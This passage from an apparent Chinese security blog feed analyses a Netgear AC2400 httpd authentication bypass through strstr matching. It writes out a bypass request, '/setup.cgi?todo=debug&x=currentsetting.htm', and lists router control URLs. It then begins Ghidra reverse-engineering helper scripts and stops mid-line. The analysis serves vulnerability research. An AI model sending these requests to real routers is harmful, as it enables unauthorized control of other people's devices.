<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 交叉引用 is_setup_wizard，找到my_handle_request中</span></span><br><span class="line"><span class="comment"># 但不全，需要反编译窗口中继续手动找</span></span><br><span class="line"><span class="comment"># 有多处，需分析后取舍，比如1229行调用my_auth_check，要找之前的、离他最近的，要833行，而555行不可</span></span><br><span class="line">  <span class="keyword">if</span> ( path_exist(path_1, off_427E50, method_str_1)</span><br><span class="line">    || (path_3 = path_1, strstr(path_1, <span class="string">"htpwd_recovery.cgi"</span>))</span><br><span class="line">    &amp;&amp; (method_post = get_method_str(3), !strcasecmp(method_str_1, method_post))</span><br><span class="line">    || strstr(path_3, <span class="string">"PNPX_GetShareFolderList"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    what_1 = 0;<span class="comment"># 只满足外层if时</span></span><br><span class="line">    what_2 = 0;<span class="comment"># 清0</span></span><br><span class="line">    <span class="keyword">if</span> ( strstr(path_1, <span class="string">"currentsetting.htm"</span>) )</span><br><span class="line">      is_setup_wizard = 1;<span class="comment"># 两层if都要满足</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 要执行到，有2个if要满足</span></span><br><span class="line"><span class="comment"># 内层：请求的path中有"currentsetting.htm"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 外层：3个或关系，其中一个是&amp;起来的，即a || b&amp;&amp;c || d，&amp;&amp;优先级高于||</span></span><br><span class="line"><span class="comment"># 要求1：访问的path要在off_427e50中</span></span><br><span class="line">.data:00427E50 off_427E50:     .word aCurrentsetting_0  <span class="comment"># DATA XREF: my_handle_request+1B80↑o</span></span><br><span class="line">.data:00427E50                                          <span class="comment"># my_handle_request:loc_40C178↑o</span></span><br><span class="line">.data:00427E50                                          <span class="comment"># "currentsetting.htm"</span></span><br><span class="line">.data:00427E54                 .word aUpdateSettingH    <span class="comment"># "update_setting.htm"</span></span><br><span class="line">.data:00427E58                 .word aDebuginfoHtm      <span class="comment"># "debuginfo.htm"</span></span><br><span class="line">.data:00427E5C                 .word aImportantUpdat    <span class="comment"># "important_update.htm"</span></span><br><span class="line">.data:00427E60                 .word aMnuTopHtm         <span class="comment"># "MNU_top.htm"</span></span><br><span class="line">.data:00427E64                 .word aWarningPgHtm      <span class="comment"># "warning_pg.htm"</span></span><br><span class="line">.data:00427E68                 .word aMultiLoginHtml    <span class="comment"># "multi_login.html"</span></span><br><span class="line">.data:00427E6C                 .word a401RecoveryHtm    <span class="comment"># "401_recovery.htm"</span></span><br><span class="line">.data:00427E70                 .word a401AccessDenie    <span class="comment"># "401_access_denied.htm"</span></span><br><span class="line">.data:00427E74                 .word aBrsNetgearSucc    <span class="comment"># "BRS_netgear_success.html"</span></span><br><span class="line">.data:00427E78                 .word aBrsTopHtml        <span class="comment"># "BRS_top.html"</span></span><br><span class="line">.data:00427E7C                 .word aBrsMiiicasaSuc    <span class="comment"># "BRS_miiicasa_success.html"</span></span><br><span class="line">.data:00427E80                 .word aOpenvpnConfirm    <span class="comment"># "openvpn_confirm_update.htm"</span></span><br><span class="line">.data:00427E84                 .word aTcExistUnitHij    <span class="comment"># "tc_exist_unit_hijack.htm"</span></span><br><span class="line">.data:00427E88                 .word aBrsDataDetailH    <span class="comment"># "BRS_data_detail.htm"</span></span><br><span class="line">.data:00427E8C                 .word aBrsFullTcnHtm     <span class="comment"># "BRS_full_tcn.htm"</span></span><br><span class="line">.data:00427E90                 .word 0</span><br><span class="line"><span class="comment"># 要求2: 访问的path中包含"htpwd_recovery.cgi"，并且请求类型是POST</span></span><br><span class="line">const char *__fastcall get_method_str(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  switch ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> 2:</span><br><span class="line">      <span class="built_in">return</span> <span class="string">"HEAD"</span>;</span><br><span class="line">    <span class="keyword">case</span> 3:</span><br><span class="line">      <span class="built_in">return</span> <span class="string">"POST"</span>;</span><br><span class="line">    <span class="keyword">case</span> 1:</span><br><span class="line">      <span class="built_in">return</span> <span class="string">"GET"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> <span class="string">"UNKNOWN"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 要求3: path中有"PNPX_GetShareFolderList"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 只满足外层if时，还会赋值2全局变量为0，可能会用到</span></span><br></pre></td></tr></table></figure>
<h3 id="3-do-file"><a href="#3-do-file" class="headerlink" title="3-do_file"></a>3-do_file</h3><ul>
<li>my_handle_request中还调用了my_do_file</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 由名字do_file可大致猜出：执行cig文件</span></span><br><span class="line"><span class="comment"># httpd 只充当处理请求的角色，在确定了访问哪些接口之后，它会调用相应的 cgi 程序，此函数就负责解析和调用这些 cgi 程序</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !what_2</span><br><span class="line">    || is_setup_wizard</span><br><span class="line">    || *v7 != <span class="string">'0'</span></span><br><span class="line">    || *v8 == <span class="string">'b'</span></span><br><span class="line">    || !authorization</span><br><span class="line">    || !*authorization</span><br><span class="line">    || !strncmp(path_1, <span class="string">"/cgi-bin/genie.cgi"</span>, 0x12u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( access(<span class="string">"/tmp/dbg_sessionid"</span>, 0) )</span><br><span class="line">      goto LABEL_43;</span><br><span class="line">    v14 = fopen64(<span class="string">"/dev/console"</span>, <span class="string">"a+"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v14 )</span><br><span class="line">      goto LABEL_43;</span><br><span class="line">    fprintf(v14, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"do_file"</span>, 2539);</span><br><span class="line">    fprintf(</span><br><span class="line">      v14,</span><br><span class="line">      <span class="string">"no need verify for no auth or soap or genie.cgi, %d, %d, %s, %s, %s\n"</span>,</span><br><span class="line">      what_2,</span><br><span class="line">      is_setup_wizard,</span><br><span class="line">      v7,</span><br><span class="line">      v8,</span><br><span class="line">      authorization);</span><br><span class="line">    v15 = v14;</span><br><span class="line">    goto LABEL_42;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 满足if时，会"no need verify for no auth or soap or genie.cgi"</span></span><br><span class="line"><span class="comment"># 而经过my_handle_request中，what_2会=0，而is_setup_wizard会=1，满足</span></span><br></pre></td></tr></table></figure>
<h2 id="04-认证绕过"><a href="#04-认证绕过" class="headerlink" title="04-认证绕过"></a>04-认证绕过</h2><ul>
<li>某些接口确实不需要权限验证就能访问，但是在实现这项功能时使用了 strstr 而不是精确匹配，导致出现绕过的问题</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( strstr(path_1, <span class="string">"currentsetting.htm"</span>) )</span><br><span class="line">	is_setup_wizard = 1;<span class="comment"># 两层if都要满足</span></span><br></pre></td></tr></table></figure>
<ul>
<li>AC2400 存在一个可以开启 debug 模式的接口：/setup.cgi?todo=debug</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接访问，401</span></span><br><span class="line"><span class="comment"># /setup.cgi?todo=debug&amp;x=currentsetting.htm，绕过认证</span></span><br></pre></td></tr></table></figure>
<ul>
<li>绕过逻辑</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使my_handle_request中is_setup_wizard=1，what_2=0</span></span><br><span class="line"><span class="comment"># 使my_auth_check中进入正常login的流程</span></span><br><span class="line"><span class="comment"># 使my_do_file中可打印no_need_verify那条语句</span></span><br></pre></td></tr></table></figure>
<ul>
<li>注意：比较片面化，没有从用户输入到绕过的完整处理路径</li>
</ul>
<h2 id="05-其他"><a href="#05-其他" class="headerlink" title="05-其他"></a>05-其他</h2><ul>
<li>通过特定代码段，来判定函数名</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 好像是一个报错的信息，哪个文件的哪个函数的哪一行</span></span><br><span class="line"><span class="comment"># 通过此，可判定函数名，handle_request</span></span><br><span class="line">v4 = (FILE *)fopen64(<span class="string">"/dev/console"</span>, <span class="string">"a+"</span>);</span><br><span class="line"><span class="keyword">if</span> ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  fprintf(v4, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"handle_request"</span>, 1634);</span><br><span class="line">  fputs(<span class="string">"read\n"</span>, v4);</span><br><span class="line">  fclose(v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>通过“源码+报错”方式找到如下函数</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">fprintf(v3, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"cgi_interpose_output"</span>, 3098);</span><br><span class="line">fprintf(v37, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"make_envp"</span>, 3387);</span><br><span class="line">fprintf(v15, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"add_headers"</span>, 4129);</span><br><span class="line">fprintf(v6, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"auth_check"</span>, 3487);</span><br><span class="line">fprintf(v4, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"do_file"</span>, 2515);</span><br><span class="line">fprintf(fp_console, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"handle_request"</span>, 1639);</span><br></pre></td></tr></table></figure>
<ul>
<li>其他可用链接，<a href="https://gist.github.com/Donearm/978555" target="_blank" rel="noopener">https://gist.github.com/Donearm/978555</a></li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注：对于不同型号的设备，能够绕过验证的功能不完全一致，某些可以用于 GET 请求，另一些可能只对 POST 请求有效。某些可能只对 htm 页面有效，其它只对 cgi 有效。</span></span><br><span class="line"></span><br><span class="line">DEBUGURL = <span class="string">'http://192.168.0.1/setup.cgi?todo=debug'</span></span><br><span class="line">REBOOTURL = <span class="string">'http://192.168.0.1/setup.cgi?next_file=diag.htm&amp;todo=reboot'</span></span><br><span class="line"><span class="comment">#DISCONNECTURL = 'http://192.168.0.1/setup.cgi?todo=disconnect&amp;this_file=st_poe.htm&amp;next_file=st_poe.htm'</span></span><br><span class="line">DISCONNECTURL = <span class="string">'http://192.168.0.1/setup.cgi?todo=disconnect'</span></span><br><span class="line"><span class="comment">#CONNECTURL = 'http://192.168.0.1/setup.cgi?todo=connect&amp;this_file=st_poe.htm&amp;next_file=st_poe.htm'</span></span><br><span class="line">CONNECTURL = <span class="string">'http://192.168.0.1/setup.cgi?todo=connect'</span></span><br><span class="line">STATTBLURL = <span class="string">'http://192.168.0.1/setup.cgi?next_file=stattbl.htm'</span></span><br><span class="line">LOGOUTURL = <span class="string">'http://192.168.0.1/setup.cgi?todo=logout'</span></span><br><span class="line">INTERVALURL = <span class="string">'http://192.168.0.1/setup.cgi?next_file=interval.htm'</span></span><br><span class="line">STATUSURL = <span class="string">'http://192.168.0.1/setup.cgi?next_file=s_status.htm'</span></span><br></pre></td></tr></table></figure>
<ul>
<li>此外，NetGear 存在某些历史漏洞，也是登录验证绕过，触发方法是在 URL 中添加空字节或者添加 1.jpg 等字符串，参考链接</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">https://github.com/zer0yu/CVE_Request/tree/master/netgear</span><br><span class="line">https://www.zerodayinitiative.com/advisories/ZDI-19-866/</span><br></pre></td></tr></table></figure>
<ul>
<li>//here</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在这个函数中还存在一些登录逻辑，相关代码如下</span><br><span class="line"></span><br><span class="line">strlcpy(v101, dword_429734, 10000);</span><br><span class="line">  v0 = strrchr(v101, 47);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">    *v0 = 0;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    strlcpy(v101, <span class="string">"."</span>, 10000);</span><br><span class="line">  <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">  &#123;</span><br><span class="line">    usb_auth_check(v101);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( login_or_not )</span><br><span class="line">  &#123;</span><br><span class="line">    maybe_login(v101);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  判断了 login_or_not 变量，如果不等于 0 就执行 login，同上，当构造满足特定要求的请求时，login_or_not 会被设置成 0，也能绕过这个逻辑。</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://wzt.ac.cn/2021/01/13/AC2400_vuln/" target="_blank" rel="noopener">https://wzt.ac.cn/2021/01/13/AC2400_vuln/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>认证绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>ida-ghidra使用记录</title>
    <url>/2021/07/19/reverse/ida-ghidra%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="ida-ghidra使用记录"><a href="#ida-ghidra使用记录" class="headerlink" title="ida-ghidra使用记录"></a>ida-ghidra使用记录</h1><h1 id="ghidra"><a href="#ghidra" class="headerlink" title="ghidra"></a>ghidra</h1><h2 id="00-tool-py"><a href="#00-tool-py" class="headerlink" title="00-tool.py"></a>00-tool.py</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tool kit</span></span><br><span class="line"><span class="comment"># @author lxl</span></span><br><span class="line"><span class="comment"># @category my_python_script</span></span><br><span class="line"><span class="comment"># @keybinding</span></span><br><span class="line"><span class="comment"># @menupath</span></span><br><span class="line"><span class="comment"># @toolbar</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># TODO Add User Code Here</span></span><br><span class="line"></span><br><span class="line">from __main__ import *</span><br><span class="line">from ghidra.app.decompiler import DecompInterface</span><br><span class="line">from ghidra.program.model.pcode import PcodeOp</span><br><span class="line"></span><br><span class="line">def get_varnode_value(varnode):</span><br><span class="line">    <span class="keyword">if</span> varnode.isAddress() or varnode.isConstant():</span><br><span class="line">        <span class="built_in">return</span> varnode.getAddress()</span><br><span class="line">    <span class="keyword">elif</span> varnode.isUnique() or varnode.isAddrTied() or varnode.isRegister():</span><br><span class="line">        <span class="built_in">return</span> calc_pcode_op(varnode.getDef())</span><br><span class="line">    <span class="keyword">elif</span> varnode.isPersistant() or varnode.isUnaffected():</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">def calc_pcode_op(p_code):</span><br><span class="line">    op_code = p_code.getOpcode()</span><br><span class="line">    <span class="comment"># PTRSUB</span></span><br><span class="line">    <span class="keyword">if</span> op_code == PcodeOp.PTRSUB:</span><br><span class="line">        <span class="comment"># print("p_code: %s, op_code: PTRSUB" % p_code)</span></span><br><span class="line">        value_1 = get_varnode_value(p_code.getInput(0))</span><br><span class="line">        value_2 = get_varnode_value(p_code.getInput(1))</span><br><span class="line">        <span class="keyword">if</span> isinstance(value_1, GenericAddress) and isinstance(value_2, GenericAddress):</span><br><span class="line">            <span class="built_in">return</span> value_1.offset + value_2.offset</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print("value_1: &#123;&#125;".format(value_1))</span></span><br><span class="line">            <span class="comment"># print("value_2: &#123;&#125;".format(value_2))</span></span><br><span class="line">            <span class="built_in">return</span> None</span><br><span class="line">    <span class="comment"># CAST</span></span><br><span class="line">    <span class="keyword">elif</span> op_code == PcodeOp.CAST:</span><br><span class="line">        <span class="comment"># print("p_code: %s, op_code: CAST" % p_code)</span></span><br><span class="line">        value_0 = get_varnode_value(p_code.getInput(0))</span><br><span class="line">        <span class="keyword">if</span> isinstance(value_0, GenericAddress):</span><br><span class="line">            <span class="built_in">return</span> value_0.offset</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> None</span><br><span class="line">    <span class="comment"># PTRADD</span></span><br><span class="line">    <span class="keyword">elif</span> op_code == PcodeOp.PTRADD:</span><br><span class="line">        <span class="comment"># print("p_code: %s, op_code: PTRADD" % p_code)</span></span><br><span class="line">        try:</span><br><span class="line">            value_0_point = get_varnode_value(p_code.getInput(0))</span><br><span class="line">            <span class="comment"># print("value_0_point: &#123;&#125;".format(value_0_point))</span></span><br><span class="line">            <span class="keyword">if</span> not isinstance(value_0_point, GenericAddress):</span><br><span class="line">                <span class="built_in">return</span></span><br><span class="line">            value_0 = toAddr(getInt(value_0_point))</span><br><span class="line">            <span class="comment"># print("value_0: &#123;&#125;".format(value_0))</span></span><br><span class="line">            <span class="comment"># print("type(value_0): &#123;&#125;".format(type(value_0)))</span></span><br><span class="line">            value_1 = get_varnode_value(p_code.getInput(1))</span><br><span class="line">            <span class="comment"># print("value_1: &#123;&#125;".format(value_1))</span></span><br><span class="line">            <span class="comment"># print("type(value_1): &#123;&#125;".format(type(value_1)))</span></span><br><span class="line">            <span class="keyword">if</span> not isinstance(value_1, GenericAddress):</span><br><span class="line">                <span class="comment"># print("value_1 is not GenericAddress!")</span></span><br><span class="line">                <span class="built_in">return</span></span><br><span class="line">            value_1 = get_signed_value(value_1.offset)</span><br><span class="line">            value_2 = get_varnode_value(p_code.getInput(2))</span><br><span class="line">            <span class="comment"># print("value_2: &#123;&#125;".format(value_2))</span></span><br><span class="line">            <span class="comment"># print("type(value_2): &#123;&#125;".format(type(value_2)))</span></span><br><span class="line">            <span class="keyword">if</span> not isinstance(value_2, GenericAddress):</span><br><span class="line">                <span class="built_in">return</span></span><br><span class="line">            output_value = value_0.add(value_1)</span><br><span class="line">            <span class="comment"># print("output_value: &#123;&#125;".format(output_value))</span></span><br><span class="line">            <span class="built_in">return</span> output_value.offset</span><br><span class="line"></span><br><span class="line">        except Exception as err:</span><br><span class="line">            <span class="comment"># print("Got something wrong with calc PcodeOp.PTRADD : &#123;&#125;".format(err))</span></span><br><span class="line">            <span class="built_in">return</span> None</span><br><span class="line"></span><br><span class="line">        except:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Got something wrong with calc PcodeOp.PTRADD "</span>)</span><br><span class="line">            <span class="built_in">return</span> None</span><br><span class="line">    <span class="comment"># INDIRECT</span></span><br><span class="line">    <span class="keyword">elif</span> op_code == PcodeOp.INDIRECT:</span><br><span class="line">        <span class="comment"># print("p_code: %s, op_code: INDIRECT" % p_code)</span></span><br><span class="line">        <span class="built_in">return</span> None</span><br><span class="line">    <span class="comment"># MULTIEQUAL</span></span><br><span class="line">    <span class="keyword">elif</span> op_code == PcodeOp.MULTIEQUAL:</span><br><span class="line">        <span class="comment"># print("p_code: %s, op_code: MULTIEQUAL" % p_code)</span></span><br><span class="line">        <span class="built_in">return</span> None</span><br><span class="line">    <span class="comment"># COPY</span></span><br><span class="line">    <span class="keyword">elif</span> op_code == PcodeOp.COPY:</span><br><span class="line">        <span class="comment"># print("p_code: %s, op_code: COPY" % p_code)</span></span><br><span class="line">        <span class="comment"># print("input_0: %s, output: %s" % (p_code.getInput(0), p_code.getOutput()))</span></span><br><span class="line">        value = get_varnode_value(p_code.getInput(0))</span><br><span class="line">        <span class="built_in">return</span> value</span><br><span class="line">class FuncParser(object):</span><br><span class="line">    def __init__(self, func):</span><br><span class="line">        self.func = func</span><br><span class="line">        self.pcode_dict = self.get_all_pcode()</span><br><span class="line"></span><br><span class="line">    def get_all_pcode(self):</span><br><span class="line">        dec_lib = DecompInterface()</span><br><span class="line">        dec_lib.openProgram(currentProgram)</span><br><span class="line">        dec_res = dec_lib.decompileFunction(self.func, 30, getMonitor())</span><br><span class="line">        high_func = dec_res.getHighFunction()</span><br><span class="line">        ops = high_func.getPcodeOps()</span><br><span class="line"></span><br><span class="line">        pcode_dict = &#123;&#125;</span><br><span class="line">        <span class="keyword">while</span> ops.hasNext():</span><br><span class="line">            p_code = ops.next()</span><br><span class="line">            op_code = p_code.getOpcode()</span><br><span class="line">            <span class="keyword">if</span> op_code not <span class="keyword">in</span> [PcodeOp.CALL, PcodeOp.CALLIND]:</span><br><span class="line">                <span class="built_in">continue</span></span><br><span class="line">            caller_addr = p_code.getInput(0).getPCAddress()</span><br><span class="line">            pcode_dict[caller_addr] = p_code</span><br><span class="line">        <span class="built_in">return</span> pcode_dict</span><br><span class="line"></span><br><span class="line">    def get_arg_list(self, caller_addr):</span><br><span class="line">        arg_list = []</span><br><span class="line">        p_code = self.pcode_dict[caller_addr]</span><br><span class="line">        args = p_code.getInputs()[1:]</span><br><span class="line">        <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">            arg_list.append(arg)</span><br><span class="line">        <span class="built_in">return</span> arg_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def is_addr_in_cur_program(addr):</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> currentProgram.memory.blocks:</span><br><span class="line">        <span class="keyword">if</span> block.getStart().offset &lt;= addr.offset &lt;= block.getEnd().offset:</span><br><span class="line">            <span class="built_in">return</span> True</span><br><span class="line">    <span class="built_in">return</span> False</span><br><span class="line"></span><br><span class="line">def get_arg_list(pcode_dict, caller_addr):</span><br><span class="line">    arg_list = []</span><br><span class="line">    p_code = pcode_dict[caller_addr]</span><br><span class="line">    args = p_code.getInputs()[1:]</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">        arg_list.append(arg)</span><br><span class="line">    <span class="built_in">return</span> arg_list</span><br><span class="line"></span><br><span class="line">def get_func_pcode(func):</span><br><span class="line">    dec_lib = DecompInterface()</span><br><span class="line">    dec_lib.openProgram(currentProgram)</span><br><span class="line">    dec_res = dec_lib.decompileFunction(func, 30, getMonitor())</span><br><span class="line">    high_func = dec_res.getHighFunction()</span><br><span class="line">    ops = high_func.getPcodeOps()</span><br><span class="line"></span><br><span class="line">    pcode_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> ops.hasNext():</span><br><span class="line">        p_code = ops.next()</span><br><span class="line">        op_code = p_code.getOpcode()</span><br><span class="line">        <span class="keyword">if</span> op_code not <span class="keyword">in</span> [PcodeOp.CALL, PcodeOp.CALLIND]:</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">        caller_addr = p_code.getInput(0).getPCAddress()</span><br><span class="line">        pcode_dict[caller_addr] = p_code</span><br><span class="line">    <span class="built_in">return</span> pcode_dict</span><br><span class="line"></span><br><span class="line">def trace_varnode_value(varnode):</span><br><span class="line">    <span class="keyword">while</span> not varnode.isConstant():</span><br><span class="line">        pcode_op = varnode.getDef()</span><br><span class="line">        op_code = pcode_op.getOpcode()</span><br><span class="line">        <span class="keyword">if</span> pcode_op is None:</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">elif</span> op_code <span class="keyword">in</span> [PcodeOp.CAST, PcodeOp.COPY]:</span><br><span class="line">            varnode = pcode_op.getInput(0)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">elif</span> op_code <span class="keyword">in</span> [PcodeOp.PTRSUB, PcodeOp.PTRADD]:</span><br><span class="line">            varnode = pcode_op.getInput(1)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">elif</span> op_code <span class="keyword">in</span> [PcodeOp.INT_MULT, PcodeOp.MULTIEQUAL]:</span><br><span class="line">            <span class="built_in">return</span> None</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> None</span><br><span class="line">    <span class="built_in">return</span> varnode.getOffset()</span><br><span class="line"></span><br><span class="line">def get_string_by_addr(addr):</span><br><span class="line">    mem = currentProgram.getMemory()</span><br><span class="line">    core_name_str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        byte = mem.getByte(addr.add(len(core_name_str)))</span><br><span class="line">        <span class="keyword">if</span> byte == 0:</span><br><span class="line">            <span class="built_in">return</span> core_name_str</span><br><span class="line">        core_name_str += chr(byte)</span><br><span class="line"></span><br><span class="line">def get_arg_value(arg_list, arg_index):</span><br><span class="line">    arg = arg_list[arg_index - 1]</span><br><span class="line">    value = trace_varnode_value(arg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># None</span></span><br><span class="line">    <span class="keyword">if</span> not value:</span><br><span class="line">        <span class="built_in">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># char* or int</span></span><br><span class="line">    arg_value = 0</span><br><span class="line">    arg_addr = toAddr(value)</span><br><span class="line">    <span class="keyword">if</span> is_addr_in_cur_program(arg_addr):</span><br><span class="line">        <span class="keyword">if</span> getDataAt(arg_addr):</span><br><span class="line">            arg_value = get_string_by_addr(arg_addr)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            arg_value = value</span><br><span class="line">    <span class="built_in">return</span> arg_value</span><br><span class="line"></span><br><span class="line">def get_caller_dict(target_func):</span><br><span class="line">    caller_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    entry_point = target_func.getEntryPoint()</span><br><span class="line">    refs = getReferencesTo(entry_point)</span><br><span class="line">    <span class="keyword">for</span> ref <span class="keyword">in</span> refs:</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        ref_type = ref.getReferenceType()</span><br><span class="line">        <span class="keyword">if</span> not ref_type.isCall():</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        caller_addr = ref.getFromAddress()</span><br><span class="line">        caller_func = getFunctionContaining(caller_addr)</span><br><span class="line">        <span class="comment"># if caller_func.name != "FUN_00406398"://here</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line"></span><br><span class="line">        pcode_dict = get_func_pcode(caller_func)</span><br><span class="line">        arg_list = get_arg_list(pcode_dict, caller_addr)</span><br><span class="line">        caller_dict[caller_addr] = &#123;</span><br><span class="line">            <span class="string">'caller_func'</span>: caller_func.name,</span><br><span class="line">            <span class="comment"># 'caller_func_addr': caller_func.getEntryPoint(),</span></span><br><span class="line">            <span class="string">'args'</span>: arg_list</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">return</span> caller_dict</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>
<h2 id="01-rename-func-by-log-py"><a href="#01-rename-func-by-log-py" class="headerlink" title="01-rename_func_by_log.py"></a>01-rename_func_by_log.py</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rename function name by log,</span></span><br><span class="line"><span class="comment"># tplink-archer-c5-v4-httpd.</span></span><br><span class="line"><span class="comment"># @author lxl</span></span><br><span class="line"><span class="comment"># @category my_script</span></span><br><span class="line"><span class="comment"># @keybinding</span></span><br><span class="line"><span class="comment"># @menupath</span></span><br><span class="line"><span class="comment"># @toolbar</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#TODO Add User Code Here</span></span><br><span class="line">from ghidra.program.model.symbol.SourceType import USER_DEFINED</span><br><span class="line">from tool import get_caller_dict, get_arg_value, get_logger</span><br><span class="line"></span><br><span class="line">debug = True</span><br><span class="line">logger = get_logger(__name__)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    logger.setLevel(10)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="comment"># 1 find func</span></span><br><span class="line">    func_name = <span class="string">"printf"</span></span><br><span class="line">    arg_idx = 2    <span class="comment"># begin from 1</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    target_func = 0</span><br><span class="line">    fm = currentProgram.getFunctionManager()</span><br><span class="line">    funcs = fm.getFunctions(True)</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> funcs:</span><br><span class="line">        <span class="keyword">if</span> func.getName() != func_name:</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">        target_func = func</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"func: %s , addr: 0x%x , arg_idx: %d"</span> %(func_name, target_func.getEntryPoint().getOffset(), arg_idx))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2 get args</span></span><br><span class="line">    rename_func_dict = &#123;&#125;</span><br><span class="line">    caller_dict = get_caller_dict(target_func)</span><br><span class="line">    <span class="keyword">for</span> caller_addr, caller_info <span class="keyword">in</span> caller_dict.items():</span><br><span class="line">        old_name = caller_info[<span class="string">'caller_func'</span>]</span><br><span class="line">        <span class="keyword">if</span> not old_name.startswith(<span class="string">"FUN_"</span>):</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">        arg_list = caller_info[<span class="string">'args'</span>]</span><br><span class="line">        <span class="keyword">if</span> len(arg_list) &lt; arg_idx:</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">        new_name = get_arg_value(caller_info[<span class="string">'args'</span>], arg_idx)</span><br><span class="line">        <span class="keyword">if</span> new_name is None:</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">        logger.debug(<span class="string">"old_name: %s , arg_list: 